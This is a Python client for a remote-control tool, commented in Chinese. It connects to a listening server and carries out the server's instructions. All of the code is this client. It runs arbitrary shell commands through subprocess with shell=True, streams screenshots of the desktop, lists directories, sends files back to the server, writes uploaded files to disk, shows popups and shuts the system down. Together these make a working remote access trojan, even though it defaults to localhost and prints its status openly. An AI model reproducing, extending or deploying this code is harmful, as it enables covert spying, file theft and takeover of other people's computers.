import socket
import threading
import json
import subprocess
import ctypes
import os
import base64
import time
import io

# 尝试导入PIL，如果失败则给出提示
try:
    from PIL import ImageGrab
except ImportError:
    print("警告: 未安装 Pillow 库，屏幕监控功能将不可用。请运行 pip install Pillow")
    ImageGrab = None


class ControlledClient:
    def __init__(self, server_ip='127.0.0.1', server_port=9178):
        self.server_ip = server_ip
        self.server_port = server_port
        self.socket = None
        self.running = True
        self.stream_thread = None

    def connect(self):
        print(f"正在尝试连接服务端 {self.server_ip}:{self.server_port}...")
        while self.running:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.server_ip, self.server_port))
                print("连接成功！等待指令...")
                recv_thread = threading.Thread(target=self.receive_loop, daemon=True)
                recv_thread.start()
                break
            except ConnectionRefusedError:
                print("连接被拒绝，服务端可能未启动。5秒后重试...")
                time.sleep(5)
            except Exception as e:
                print(f"连接错误: {e}. 5秒后重试...")
                time.sleep(5)

    def send_response(self, r_type, data):
        if not self.socket: return
        packet = {"type": r_type, "data": data}
        try:
            json_data = json.dumps(packet).encode('utf-8')
            self.socket.sendall(len(json_data).to_bytes(4, 'big'))
            self.socket.sendall(json_data)
        except Exception as e:
            print(f"发送失败: {e}")
            self.running = False

    def receive_loop(self):
        while self.running:
            try:
                # 1. 读取长度头
                header = self.socket.recv(4)
                if not header:
                    print("服务端断开连接")
                    break
                if len(header) < 4:
                    continue

                length = int.from_bytes(header, 'big')

                # 2. 读取完整内容
                data = b""
                while len(data) < length:
                    chunk = self.socket.recv(length - len(data))
                    if not chunk:
                        break
                    data += chunk

                if not data:
                    break

                cmd = json.loads(data.decode('utf-8'))
                # 在新线程中执行命令，避免阻塞接收循环（特别是耗时命令）
                threading.Thread(target=self.execute, args=(cmd,), daemon=True).start()

            except Exception as e:
                print(f"接收错误: {e}")
                break

        self.running = False
        print("客户端退出")

    def execute(self, cmd):
        c_type = cmd.get("type")
        data = cmd.get("data")

        try:
            if c_type == "exec_cmd":
                self.run_cmd(data)
            elif c_type == "start_stream":
                self.start_stream(data)
            elif c_type == "stop_stream":
                self.stop_stream()
            elif c_type == "list_files":
                self.list_files(data)
            elif c_type == "download_file":
                self.send_file(data)
            elif c_type == "upload_file":
                self.save_file(data)
            elif c_type == "popup":
                self.show_popup(data)
            elif c_type == "shutdown":
                self.shutdown_system()
        except Exception as e:
            # 如果执行出错，尽量返回错误信息
            try:
                self.send_response("cmd_output", f"Error executing {c_type}: {str(e)}")
            except:
                pass

    def run_cmd(self, cmd):
        try:
            # Windows下使用gbk编码可能更兼容中文输出，这里统一用utf-8 errors ignore
            res = subprocess.run(cmd, shell=True, capture_output=True, text=True, errors='ignore')
            output = res.stdout + res.stderr
            if not output:
                output = "[Command executed with no output]"
            self.send_response("cmd_output", output)
        except Exception as e:
            self.send_response("cmd_output", str(e))

    def start_stream(self, params):
        if self.stream_thread and self.stream_thread.is_alive():
            return
        if not ImageGrab:
            self.send_response("cmd_output", "Pillow not installed on client")
            return

        self.stream_thread = threading.Thread(target=self.stream_loop, args=(params,), daemon=True)
        self.stream_thread.start()

    def stream_loop(self, params):
        quality = params.get("quality", 50)
        fps = params.get("fps", 2)
        interval = 1.0 / fps if fps > 0 else 0.5

        while self.running and self.stream_thread:
            start_time = time.time()
            try:
                img = ImageGrab.grab()
                buf = io.BytesIO()
                # 转换为RGB以防RGBA导致JPEG保存错误
                if img.mode != 'RGB':
                    img = img.convert('RGB')
                img.save(buf, format="JPEG", quality=quality)
                b64_str = base64.b64encode(buf.getvalue()).decode('utf-8')
                self.send_response("screen_data", b64_str)
            except Exception as e:
                print(f"Stream error: {e}")
                break

            elapsed = time.time() - start_time
            sleep_time = interval - elapsed
            if sleep_time > 0:
                time.sleep(sleep_time)

    def stop_stream(self):
        self.stream_thread = None

    def list_files(self, path):
        try:
            # 安全检查，防止遍历根目录过大，这里简单处理
            if not os.path.exists(path):
                self.send_response("file_list", [])
                return

            files = []
            for f in os.listdir(path):
                full_path = os.path.join(path, f)
                try:
                    size = os.path.getsize(full_path) if os.path.isfile(full_path) else 0
                    f_type = "DIR" if os.path.isdir(full_path) else "FILE"
                    files.append({
                        "name": f,
                        "size": size,
                        "type": f_type
                    })
                except:
                    continue  # 跳过权限不足的文件
            self.send_response("file_list", files)
        except Exception as e:
            self.send_response("file_list", [])

    def send_file(self, filename):
        try:
            # 简单起见，假设在当前工作目录或绝对路径
            if not os.path.isabs(filename):
                # 如果是相对路径，可能需要结合当前浏览的路径，这里简化为当前脚本所在目录或cwd
                filename = os.path.join(os.getcwd(), filename)

            with open(filename, 'rb') as f:
                content = base64.b64encode(f.read()).decode('utf-8')
            self.send_response("file_content", {"path": filename, "content": content})
        except Exception as e:
            self.send_response("cmd_output", f"Download failed: {str(e)}")

    def save_file(self, data):
        try:
            target_dir = data['target_dir']
            name = data['name']
            content_b64 = data['content']

            if not os.path.exists(target_dir):
                os.makedirs(target_dir, exist_ok=True)

            path = os.path.join(target_dir, name)
            with open(path, 'wb') as f:
                f.write(base64.b64decode(content_b64))
            self.send_response("cmd_output", f"File uploaded successfully to {path}")
        except Exception as e:
            self.send_response("cmd_output", f"Upload failed: {str(e)}")

    def show_popup(self, msg):
        try:
            # 仅支持Windows
            ctypes.windll.user32.MessageBoxW(0, msg, "Remote Message", 0)
        except:
            pass

    def shutdown_system(self):
        try:
            if os.name == 'nt':
                os.system("shutdown /s /t 1")
            else:
                os.system("shutdown -h now")
        except:
            pass


if __name__ == "__main__":
    # 可以在这里修改服务端的IP地址
    client = ControlledClient(server_ip='127.0.0.1', server_port=9999)
    client.connect()
    try:
        while client.running:
            time.sleep(1)
    except KeyboardInterrupt:
        client.running = False
